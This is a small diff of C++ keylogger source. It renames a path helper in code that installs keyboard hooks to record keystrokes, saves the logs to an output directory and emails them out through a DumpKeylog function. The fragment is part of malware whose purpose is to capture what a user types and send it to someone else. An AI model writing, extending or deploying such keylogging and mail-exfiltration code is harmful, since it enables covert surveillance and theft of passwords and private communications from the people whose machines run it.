@@ -37,7 +37,7 @@ void DumpKeylog()
 		return;
 	}
 
-	std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetPath(true));
+	std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
 	int x = Mail::SendMail("Log [" + filename + "]", "", filename);
 
 	if (x != 7)
@@ -49,7 +49,7 @@ void DumpKeylog()
 int main(int argc, char** argv)
 {
 	// Makes output directory for logs
-	IO::MKDir(IO::GetPath(true));
+	IO::MKDir(IO::GetOutputPath(true));
 
 	// Start Listening to keystrokes
 	keyboardManager.InstallHooks();
